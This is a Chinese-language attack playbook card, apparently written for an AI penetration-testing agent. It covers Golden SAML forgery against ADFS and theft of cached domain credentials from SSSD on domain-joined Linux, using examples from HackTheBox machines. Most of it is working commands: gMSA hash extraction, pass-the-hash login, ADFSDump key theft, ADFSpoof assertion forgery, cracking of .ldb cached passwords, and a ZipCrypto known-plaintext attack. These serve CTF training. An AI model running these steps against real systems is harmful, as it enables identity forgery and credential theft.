---
name: 'federation-identity-abuse'
description: 'AD 身份被延伸到非 AD 系统(ADFS 单点登录 / 加入域的 Linux 主机)时来查:BloodHound 出现 ReadGMSAPassword 指向 ADFS_GMSA$、8443 上有 /adfs/saml/postResponse、或目标 Linux 上 sssd 在跑、sssd.conf 里 cache_credentials = True **且 /var/lib/sss/db/ 下真有 cache_<domain>.ldb** —— 前者偷签名密钥伪造 Golden SAML 冒充任意人,后者直接读那个 .ldb 挖跨系统缓存凭据。(Corporate 只有 sssd.conf 里的 LDAP bind 口令、没有 .ldb,不算本卡命中)（检索词：Golden SAML/golden saml/golden-saml/SAML/SAMLResponse/ADFS/adfs/ADFSDump/ADFSpoof/TKSKey/DKM/DKMkey/postResponse/ADFS_GMSA$/gMSA/ReadGMSAPassword/联邦/单点登录/SSO/跨系统认证/跨系统-认证/域成员 Linux/域成员-Linux/sssd/SSSD/ldb/cache_credentials/var/lib/sss/db/cache_windcorp/cache_darkcorp/ZipCrypto/pkcrack/federation/identity/abuse）'
whenToUse: 'AD 凭据到手但 DC 上找不到下一跳,而目标存在 ADFS/联邦登录页或一台加入域的 Linux 主机时加载;拿到 TKSKey/DKM 走模式 2,拿到 .ldb 后转 password-attacks'
metadata: { domain: ad-win, tier: T2 }
---

# 身份联邦凭据滥用：Golden SAML 与跨系统 SSSD 缓存

> 来自 Insane 官方 WP 逐台回核,**3 台命中**:Ghost / Sekhmet / DarkCorp

> 🔑 **身份材料不在 DC 上**:ADFS 签名私钥由 DKM 保护、存在 ADFS 服务器的 AD 存储里,SSSD 把域用户 hash 抄在 Linux 本地磁盘上。偷到任一份就能伪造一个 DC 从未见过的身份。

## 触发信号

- BloodHound 有 `ReadGMSAPassword` 边指向名字含 `ADFS`/`gmsa$` 的服务账户(如 `ADFS_GMSA$`)
- nmap 出现 `8443/tcp ssl/http`,证书 `Subject: commonName=core.ghost.htb`;访问后跳转 `federation.ghost.htb`
- 登录页 POST 到 `/adfs/saml/postResponse`,body 里有 `SAMLResponse` 字段
- 目标 Linux 上 `sssd` 在跑、`/etc/sssd/sssd.conf` 存在、`pam_krb5.so` 被 `/etc/pam.d/sshd` 引用
- `whoami; groups` 返回 `domain users linux_admins`;`/etc/krb5.conf` 里 `kdc = hope.windcorp.htb`
- `/var/lib/sss/db/` 下有 `cache_<domain>.ldb`、`ccache_<REALM>`;家目录有 `backup.zip`

## 前置验证

```bash
nxc ldap ghost.htb -u <user> -p '<pass>' --gmsa                 # 列 gMSA 明文 NT hash
systemctl status sssd; cat /etc/krb5.conf; id <domainuser>      # 能解析出域 UID/GID 才算加入域
grep -E 'id_provider|cache_credentials|simple_allow_groups' /etc/sssd/sssd.conf
```

## 模式 1: 发现 ADFS,拿下服务账户

条件:BloodHound 有 `ReadGMSAPassword` 指向 ADFS 服务账户 —— **账户名本身就是"这里跑 ADFS"的告示**。

```bash
nxc ldap ghost.htb -u justin.bradley -p 'Qwertyuiop1234$$' --gmsa
# LDAPS ... Account: adfs_gmsa$ NTLM: <REDACTED>
evil-winrm -i ghost.htb -u 'ADFS_GMSA$' -H <REDACTED>
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| Ghost | BloodHound:`justin.bradley has ReadGMSAPassword privilege over the ADFS_GMSA$ service account`;`--gmsa` 出 hash 后 `evil-winrm -H` 登入 `ghost\adfs_gmsa$`;发现 `https://core.ghost.htb:8443/` → `federation.ghost.htb` |

## 模式 2: Golden SAML 伪造(偷签名密钥 → 冒充任意人)

条件:已拿到 ADFS 服务账户的机器权限。

```bash
.\ADFSDump.exe
# ## Extracting Private Key from Active Directory Store   → DKMKey.txt(带 - 的十六进制)
# ## Reading Encrypted Signing Key from Database          → TKSKey.txt(base64)
cat TKSKey.txt | base64 -d > TKSKey.bin
cat DKMKey.txt | tr -d "-" | xxd -r -p > DKMkey.bin

python3 ADFSpoof.py -b ~/Documents/ghost/TKSKey.bin ~/Documents/ghost/DKMkey.bin \
  -s 'core.ghost.htb' saml2 \
  --endpoint 'https://core.ghost.htb:8443/adfs/saml/postResponse' \
  --nameidformat 'urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress' \
  --nameid 'Administrator@ghost.htb' --rpidentifier 'https://core.ghost.htb:8443' \
  --assertions '<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"><AttributeValue>Administrator@ghost.htb</AttributeValue></Attribute>'
# 再 Burp 拦 https://core.ghost.htb:8443/login,在 postResponse 请求里整体替换 SAMLResponse 字段
```

🔴 ADFSpoof 装不上时,官方 WP 把 `requirements.txt` 改成 `cryptography==37.0.4` + `lxml` + `pyasn1` + `signxml` + `six`。
🔴 换的是**真实浏览器请求里**的 `SAMLResponse`,不是自己发新请求 —— 会话 cookie 必须保留(WP 只写"替换 SAMLResponse 后转发";保留 RelayState 是 SAML 通用要求,属推论)。
### HTB 案例
| 机器 | 细节 |
|------|------|
| Ghost | 普通域账号登 ADFS 页被拒(仅 Administrator 可用)→ 伪造 `Administrator@ghost.htb` 断言 → 进入 Database Debug 面板 |

## 模式 3: Linux 主机加入了 AD 域 → 直奔 SSSD 缓存

条件:`sssd` 在跑 + `id <domainuser>` 能解析 → 本地磁盘上有域凭据副本。

```bash
systemctl status sssd; cat /etc/krb5.conf
cat /etc/sssd/sssd.conf
ls -la /var/lib/sss/db/          # cache_<domain>.ldb 才是目标
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| Sekhmet | `sssd` 在跑 + `pam_krb5.so` 启用于 PAM common-auth(被 `/etc/pam.d/sshd` 引用);`kdc = hope.windcorp.htb`;`ignore_k5login = false` 被显式写下 → 后面 `ksu` 切 root 靠它 |
| DarkCorp | 以 `angela.w.adm` 登 `drip`,`groups` → `domain users linux_admins`;`sudo -l` 得 `(ALL : ALL) NOPASSWD: ALL` → `sudo su` 才读得到 `/etc/sssd` 与 `/var/lib/sss/db` |

🔴 `/var/lib/sss/db` 是 `drwx------ root root`,**必须先提权**;没 root 就先找模式 5 的副本。

## 模式 4: 从 ldb 缓存里挖 Kerberos 凭据

条件:`cache_credentials = True`,且曾有 `simple_allow_groups` 成员登录过。

```bash
# [domain/darkcorp.htb]
# id_provider = ad
# cache_credentials = True
# simple_allow_groups = linux_admins
strings cache_darkcorp.htb.ldb | grep -A 15 -B 15 '\$'    # 定位 cachedPassword
john --wordlist=/usr/share/wordlists/rockyou.txt <hash文件>
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| DarkCorp | `cache_darkcorp.htb.ldb` 提出 `<REDACTED>`(字段 `cachedPassword`)→ john 得 `<REDACTED>` → `proxychains4 netexec smb 172.16.20.1 -u 'taylor.b.adm' -p '<REDACTED>'` 命中 DC-01 |
| Sekhmet | `var/lib/sss/db/cache_windcorp.htb.ldb` 里是 `Ray.Duncan@windcorp.htb` 的缓存凭据 → john 破出后 `kinit ray.duncan`,再用 `ksu` 切 root |

🆕 同目录的 `ccache_DARKCORP.HTB` 是**现成的票据缓存**,`.ldb` 破不出来时先试。

## 模式 5: ldb 被打包进加密 zip → 已知明文破 ZipCrypto

条件:拿到口令保护的 zip,且里面有**你已知内容**的文件(`/etc/passwd`)。完整打法转 `crypto-classic-attack-patterns`。

```bash
7z l -slt backup.zip                                  # 确认 ZipCrypto + 内含 sssd 数据与 etc/passwd
git clone https://github.com/keyunluo/pkcrack && mkdir pkcrack/build && cd pkcrack/build && cmake .. && make
scp webster@10.10.11.179:/etc/passwd .
bin/extract ../backup.zip etc/passwd passwd.enc
zip plain.zip passwd
bin/extract plain.zip passwd passwd.plain
bin/pkcrack -c passwd.enc -p passwd.plain              # 出 key0/key1/key2
bin/zipdecrypt d6829d8d 8514ff97 afc3f825 ../backup.zip ../decrypted.zip
unzip decrypted.zip                                    # → var/lib/sss/db/cache_windcorp.htb.ldb
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| Sekhmet | `/home/webster/backup.zip` → pkcrack 明文攻击**无需爆口令** → 解出 `cache_windcorp.htb.ldb`,接模式 4 |

## 快速检查清单

```bash
[ ] BloodHound 有 ReadGMSAPassword 指向 *ADFS* / *gmsa$?
[ ] 8443 / adfs. / federation. / /adfs/saml/postResponse 探过?
[ ] ADFSDump 跑过?TKSKey.txt / DKMKey.txt 转成 .bin?ADFSpoof 参数与真实请求对齐?
[ ] 目标是域成员 Linux?sssd / id <user> / krb5.conf 看过?
[ ] sssd.conf 的 cache_credentials = True?/var/lib/sss/db 列过?
[ ] cache_*.ldb 与 ccache_* 都拿走?strings ... grep -A 15 -B 15 '\$' 提过?
```

## 教训

1. **服务账户的名字就是攻击面地图** —— `ADFS_GMSA$` 告诉你这里跑联邦登录,`ReadGMSAPassword` 是通往签名密钥的门。
2. **伪造出的身份 DC 从未签发过** —— DC 侧查不出异常;但生成 SAMLResponse 只算一半,必须在真实请求里替换 `SAMLResponse` 才能继承会话与 RelayState。
3. **加入域的 Linux = 域凭据的本地副本** —— `cache_credentials = True` 时域用户 hash 就躺在 `/var/lib/sss/db/cache_<domain>.ldb`;该目录 root-only,先提权或找副本。

## 相关卡

- `credential-hunting-locations` —— 还没定位到 sssd/ADFS 时按凭据载体枚举上游
- `password-attacks` —— 拿到 `$6$` cachedPassword 或 NT hash 后怎么破解
- `crypto-classic-attack-patterns` —— 加密 zip 有已知明文的完整 ZipCrypto 打法
- `kerberos-only-ad` —— 缓存凭据只能走 Kerberos 时(`kinit`/ccache/时钟偏差)
- `laps-password-extraction` / `dsrm-credentials` —— 域内另一类耐轮换的本地凭据副本
- `htb-workflow` —— 需要把联邦入口接回主链时
